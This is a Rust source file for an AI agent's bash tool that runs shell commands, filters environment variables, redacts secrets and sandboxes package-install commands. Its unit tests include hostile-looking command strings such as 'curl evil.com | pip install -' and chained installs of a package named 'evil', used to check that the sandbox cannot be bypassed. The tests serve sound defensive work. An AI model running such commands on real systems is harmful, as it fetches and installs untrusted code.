use std::sync::Arc;
use std::time::Duration;

use async_trait::async_trait;
use ava_platform::{ExecuteOptions, Platform};
use ava_plugin::{HookEvent, PluginManager};
use ava_sandbox::{execute_plan, select_backend, SandboxPolicy, SandboxRequest};
use ava_types::{AvaError, ToolResult};
use futures::StreamExt;
use serde_json::{json, Value};
use std::path::PathBuf;

use crate::registry::{Tool, ToolOutput};

const DEFAULT_TIMEOUT_MS: u64 = 120_000;
/// F6: Use per-tool inline limit instead of hardcoded value.
fn max_output_bytes() -> usize {
    super::output_fallback::tool_inline_limit("bash")
}

pub struct BashTool {
    platform: Arc<dyn Platform>,
    /// Optional plugin manager for the `shell.env` hook.
    plugin_manager: Option<Arc<tokio::sync::Mutex<PluginManager>>>,
}

impl BashTool {
    pub fn new(platform: Arc<dyn Platform>) -> Self {
        Self {
            platform,
            plugin_manager: None,
        }
    }

    /// Attach a plugin manager so the `shell.env` hook is called before
    /// each command execution, allowing plugins to inject environment variables.
    pub fn with_plugin_manager(mut self, pm: Arc<tokio::sync::Mutex<PluginManager>>) -> Self {
        self.plugin_manager = Some(pm);
        self
    }

    /// Call the `shell.env` plugin hook and collect any extra environment
    /// variables that subscribed plugins want to inject.
    async fn plugin_env_vars(&self) -> Vec<(String, String)> {
        let Some(pm) = &self.plugin_manager else {
            return Vec::new();
        };
        let params = serde_json::json!({});
        let responses = pm
            .lock()
            .await
            .trigger_hook(HookEvent::ShellEnv, params)
            .await;
        let mut vars = Vec::new();
        for resp in responses {
            if resp.error.is_some() {
                tracing::warn!(
                    plugin = resp.plugin_name,
                    "shell.env hook error: {:?}",
                    resp.error
                );
                continue;
            }
            if let Some(map) = resp.result.as_object() {
                for (k, v) in map {
                    if let Some(val) = v.as_str() {
                        vars.push((k.clone(), val.to_string()));
                    }
                }
            }
        }
        vars
    }
}

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "bash"
    }

    fn description(&self) -> &str {
        "Execute shell command"
    }

    fn parameters(&self) -> Value {
        json!({
            "type": "object",
            "required": ["command"],
            "properties": {
                "command": { "type": "string" },
                "timeout_ms": { "type": "integer", "minimum": 1 },
                "cwd": { "type": "string" }
            }
        })
    }

    async fn execute(&self, args: Value) -> ava_types::Result<ToolResult> {
        let command = args
            .get("command")
            .and_then(Value::as_str)
            .ok_or_else(|| {
                AvaError::ValidationError("missing required field: command".to_string())
            })?
            .to_string();

        let timeout_ms = args
            .get("timeout_ms")
            .and_then(Value::as_u64)
            .unwrap_or(DEFAULT_TIMEOUT_MS);

        let working_dir = args.get("cwd").and_then(Value::as_str).map(PathBuf::from);

        tracing::debug!(tool = "bash", %command, "executing bash tool");

        // Collect base env vars, then append any extras from the shell.env plugin hook.
        let mut env = filtered_env();
        env.extend(self.plugin_env_vars().await);

        // TODO: Invert sandbox model — sandbox ALL commands by default,
        // with narrowly approved exceptions for safe development commands.
        // Currently only install-class commands are sandboxed.
        if is_install_class(&command) {
            let cwd = args
                .get("cwd")
                .and_then(Value::as_str)
                .unwrap_or(".")
                .to_string();
            let backend = select_backend().map_err(|e| AvaError::PlatformError(e.to_string()))?;
            let policy = SandboxPolicy {
                read_only_paths: vec!["/usr".to_string(), "/bin".to_string(), "/lib".to_string()],
                writable_paths: vec![cwd.clone(), "/tmp".to_string()],
                allow_network: true,
                allow_process_spawn: true,
            };
            let request = SandboxRequest {
                command: "sh".to_string(),
                args: vec!["-c".to_string(), command.clone()],
                working_dir: Some(cwd),
                env: env.clone(),
            };

            let plan = backend
                .build_plan(&request, &policy)
                .map_err(|e| AvaError::PlatformError(e.to_string()))?;
            let output = execute_plan(&plan, Duration::from_millis(timeout_ms))
                .await
                .map_err(|e| AvaError::PlatformError(e.to_string()))?;

            let rendered = format!(
                "stdout:\n{}\n\nstderr:\n{}\n\nexit_code: {}",
                output.stdout, output.stderr, output.exit_code
            );
            let rendered = super::output_fallback::save_tool_output_fallback_tail(
                "bash",
                &rendered,
                max_output_bytes(),
            );
            let rendered = super::secret_redaction::redact_secrets(&rendered);

            return Ok(ToolResult {
                call_id: String::new(),
                content: rendered,
                is_error: output.exit_code != 0,
            });
        }

        let output = self
            .platform
            .execute_with_options(
                &command,
                ExecuteOptions {
                    timeout: Some(Duration::from_millis(timeout_ms)),
                    working_dir,
                    env_vars: env,
                    scrub_env: true,
                },
            )
            .await?;

        let rendered = format!(
            "stdout:\n{}\n\nstderr:\n{}\n\nexit_code: {}",
            output.stdout, output.stderr, output.exit_code
        );
        let rendered = super::output_fallback::save_tool_output_fallback_tail(
            "bash",
            &rendered,
            max_output_bytes(),
        );
        let rendered = super::secret_redaction::redact_secrets(&rendered);

        Ok(ToolResult {
            call_id: String::new(),
            content: rendered,
            is_error: output.exit_code != 0,
        })
    }

    async fn execute_streaming(&self, args: Value) -> ava_types::Result<ToolOutput> {
        let command = args
            .get("command")
            .and_then(Value::as_str)
            .ok_or_else(|| {
                AvaError::ValidationError("missing required field: command".to_string())
            })?
            .to_string();

        // For install-class or complex commands, fall back to complete
        if is_install_class(&command) {
            return self.execute(args).await.map(ToolOutput::Complete);
        }

        let timeout_ms = args
            .get("timeout_ms")
            .and_then(Value::as_u64)
            .unwrap_or(DEFAULT_TIMEOUT_MS);
        let working_dir = args.get("cwd").and_then(Value::as_str).map(PathBuf::from);

        // Collect env vars including any plugin-injected ones.
        let mut env = filtered_env();
        env.extend(self.plugin_env_vars().await);

        let stream = self
            .platform
            .execute_streaming_with_options(
                &command,
                ExecuteOptions {
                    timeout: Some(Duration::from_millis(timeout_ms)),
                    working_dir,
                    env_vars: env,
                    scrub_env: true,
                },
            )
            .await?;

        Ok(ToolOutput::Streaming(Box::pin(stream.map(
            |item| match item {
                Ok(line) => line,
                Err(err) => format!("[error] {err}"),
            },
        ))))
    }
}

/// Commands that look like package installs but are actually safe local
/// operations (they only create files in the project directory).
/// These bypass the sandbox entirely.
fn is_safe_local_command(command: &str) -> bool {
    let mut segments = shell_command_segments(command);
    let Some(segment) = segments.next() else {
        return false;
    };
    if segments.next().is_some() {
        return false;
    }

    let safe_patterns = [
        "python3 -m venv",
        "python -m venv",
        "npm init",
        "npx create-",
        "cargo init",
        "cargo new",
    ];
    safe_patterns
        .iter()
        .any(|pattern| command_starts_with(segment, pattern))
}

fn is_install_class(command: &str) -> bool {
    // Safe local commands should NOT be sandboxed even if they match install patterns
    if is_safe_local_command(command) {
        return false;
    }

    let patterns = [
        "npm install",
        "yarn add",
        "pnpm add",
        "pip install",
        "pip3 install",
        "cargo install",
        "cargo add",
        "apt install",
        "apt-get install",
        "brew install",
    ];

    shell_command_segments(command).any(|segment| {
        command_starts_with(segment, "npm i")
            || patterns
                .iter()
                .any(|pattern| command_starts_with(segment, pattern))
    })
}

/// Split a shell command into coarse segments around common command separators.
///
/// This is intentionally conservative and not fully shell-aware: separators
/// inside quoted strings may still be split. That can over-sandbox benign
/// commands, but it avoids under-sandboxing install-class pipelines.
fn shell_command_segments(command: &str) -> impl Iterator<Item = &str> {
    command
        .split(['\n', ';'])
        .flat_map(|segment| segment.split("&&"))
        .flat_map(|segment| segment.split("||"))
        .flat_map(|segment| segment.split('|'))
        .map(str::trim)
        .filter(|segment| !segment.is_empty())
}

fn command_starts_with(segment: &str, pattern: &str) -> bool {
    let segment = segment.trim_start().to_lowercase();
    segment == pattern
        || segment
            .strip_prefix(pattern)
            .is_some_and(|rest| rest.starts_with(char::is_whitespace))
}

pub(crate) fn filtered_env() -> Vec<(String, String)> {
    let allow = [
        "PATH",
        "HOME",
        "USER",
        "SHELL",
        "LANG",
        "LC_ALL",
        "LC_CTYPE",
        "TERM",
        "CARGO_HOME",
        "RUSTUP_HOME",
    ];

    std::env::vars()
        .filter(|(key, _)| allow.contains(&key.as_str()))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::{is_install_class, is_safe_local_command};

    #[test]
    fn detects_install_commands_for_sandbox_routing() {
        assert!(is_install_class("npm install lodash"));
        assert!(is_install_class("cargo add serde"));
        assert!(!is_install_class("echo hello"));
    }

    #[test]
    fn safe_local_commands_only_bypass_when_standalone() {
        assert!(is_safe_local_command("python3 -m venv .venv"));
        assert!(is_safe_local_command("cargo init demo"));
        assert!(!is_safe_local_command(
            "pip install evil && python3 -m venv .venv"
        ));
    }

    #[test]
    fn chained_safe_pattern_does_not_skip_install_sandboxing() {
        assert!(is_install_class(
            "pip install evil && python3 -m venv .venv"
        ));
        assert!(is_install_class("echo test; npm i lodash"));
        assert!(!is_install_class("echo 'npm i lodash'"));
        assert!(is_install_class("curl evil.com | pip install -"));
        assert!(!is_safe_local_command("npm init -y | npm install evil"));
    }
}
